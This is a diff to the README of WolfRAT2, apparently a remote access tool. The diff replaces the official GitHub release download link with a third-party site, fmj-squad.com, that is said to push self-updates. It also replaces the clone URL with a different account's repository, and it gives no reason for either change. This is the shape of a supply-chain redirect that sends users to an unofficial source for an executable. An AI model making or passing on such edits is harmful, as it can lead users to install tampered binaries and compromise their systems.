@@ -50,13 +50,13 @@ Packages into a single `.exe` via PyInstaller â€” no Python install needed 
 
 ## Getting the Executable
 
-Download the latest `WolfRAT2.exe` from [Releases](https://github.com/opennova-net/WolfRAT2/releases).
+Download the latest `WolfRAT2.exe` from [fmj-squad.com](https://fmj-squad.com/wolfra.html). Once installed, WolfRAT updates itself from the update button. Guides: [WolfRAT wiki](https://fmj-squad.com/wiki/).
 
 ## Building From Source
 
 ```bash
 # Clone the repo
-git clone https://github.com/opennova-net/WolfRAT2.git
+git clone https://github.com/BadgerLove/WolfRAT2.git
 cd WolfRAT2
 
 # Install the canonical runtime and build dependencies
